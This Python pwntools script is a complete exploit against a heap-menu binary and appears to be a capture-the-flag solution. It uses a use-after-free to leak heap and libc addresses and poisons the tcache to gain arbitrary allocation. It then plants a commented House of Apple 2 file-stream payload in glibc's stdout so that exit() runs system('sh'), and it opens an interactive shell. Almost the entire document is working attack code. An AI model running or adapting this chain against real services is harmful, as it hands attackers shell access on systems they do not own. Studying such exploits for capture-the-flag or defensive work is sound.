#!/usr/bin/python3
from pwn import *

context.log_level='debug'
name = "./vuln"
context.binary = exe = ELF(name, checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

p = process(exe.path)
# p = remote('159.89.105.235', 10001)

# gdb.attach(p, gdbscript='''
#         # b*create_memory + 189
#         # b*forget_memory + 152
#         b*create_memory+236
#         c
#                 ''' )

def create(idx, size, data):
    p.sendafter(b'> ', b'1')
    p.sendafter(b'index: ', str(idx).encode())
    p.sendafter(b'memory? ', str(size).encode())
    p.sendafter(b'remember? ', data)
    
def edit(idx, data):
    p.sendafter(b'> ', b'2')
    p.sendafter(b'rewrite? ', str(idx).encode())
    p.sendafter(b'memory: ', data)
    
def view(idx):
    p.sendafter(b'> ', b'3')
    p.sendafter(b'recall? ', str(idx).encode())
    
    
    
def forget(idx):
    p.sendafter(b'> ', b'4')
    p.sendafter(b'erase? ', str(idx).encode())
    
    
def tcache(addr, tar):
    return (addr >> 12) ^ tar

def house_of_apple2_self_overlap(libc, stdout_addr):
    """
    Returns a payload for House of Apple 2 using Self-Overlap.
    Target: stdout
    Trigger: exit() (Option 5 in menu)
    """
    system = libc.sym['system']
    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    
    # fake_vtable_ptr calculation:
    # _IO_WDOALLOCATE calls *[vtable + 0x68].
    # We want to call 'system' (which we place at offset 0xe0).
    # So: vtable + 0x68 = stdout + 0xe0
    #     vtable = stdout + 0xe0 - 0x68
    fake_vtable_ptr = stdout_addr + 0xe0 - 0x68

    payload = flat({
        # 0x00: _flags. "  sh;" avoids checks and passes "sh" to system.
        0x00: b'  sh;\x00\x00\x00',
        
        # 0x28: _IO_write_base (Standard) / _IO_write_base (Wide +0x18)
        # Must be 0.
        0x28: 0,
        
        # 0x30: _IO_write_ptr (Standard) / _IO_write_ptr (Wide +0x20)
        # [CRITICAL FIX] Set to 1 so (ptr > base) is TRUE.
        # This forces exit() to call _IO_overflow -> system.
        0x30: 1,
        
        # 0x38: _IO_buf_base. Automatically 0 via padding. 
        # Prevents free() crash if exit cleanup runs.
        
        # 0x40: _IO_buf_end (Standard) / _IO_buf_base (Wide +0x30)
        # [CRITICAL] Must be 0 to trigger allocation in _IO_wdoallocbuf.
        0x40: 0,
        
        # 0x88: _lock. Must be writable memory.
        0x88: libc.address + 0x205710, # Verify this offset in GDB if it crashes!
        
        # 0xa0: _wide_data. Point INSIDE stdout (Self-Overlap).
        0xa0: stdout_addr + 0x10,
        
        # 0xc0: _mode. Must be > 0.
        0xc0: 1,
        
        # 0xd8: vtable. Point to _IO_wfile_jumps.
        0xd8: _IO_wfile_jumps,
        
        # 0xe0: The function to call (system).
        0xe0: system,
        
        # 0xf0: _wide_vtable pointer (Offset 0xe0 inside wide_data).
        # wide_data starts at +0x10, so 0x10 + 0xe0 = 0xf0.
        0xf0: fake_vtable_ptr
        
    }, filler=b'\x00', length=0x100)
    
    return payload
    
create(0, 0x300, b'A' * 0x300)
create(1, 0x300, b'B' * 0x300)
forget(1)
view(1)
heap_base = u64(p.recv(5) + b'\0\0\0') << 12
log.info(hex(heap_base))
first_chunk = 0x2a0 + heap_base
edit(1, p64(0) * 2)
forget(1)
edit(1, p64(tcache(first_chunk + 0x310, first_chunk - 0x10)))
create(3, 0x300, b'B' * 0x1f0 + p64(0x510) + p64(0x111))
create(4, 0x300, p64(0) + p64(0x511))
forget(0)
view(0)
leak_libc = u64(p.recv(6) + b'\0\0')
libc.address = leak_libc - 0x203b20
log.info(hex(libc.address))
forget(1)
edit(1, p64(0) * 2)
forget(1)
edit(1, p64(tcache(first_chunk + 0x310, libc.sym._IO_2_1_stdout_)))
create(5, 0x300, b'B' * 0x300)
payload = house_of_apple2_self_overlap(libc, libc.sym._IO_2_1_stdout_)
payload = payload.ljust(0x300, b'\x00')
create(6, 0x300, payload)
p.sendline(b'5')
# view(6)

p.interactive()

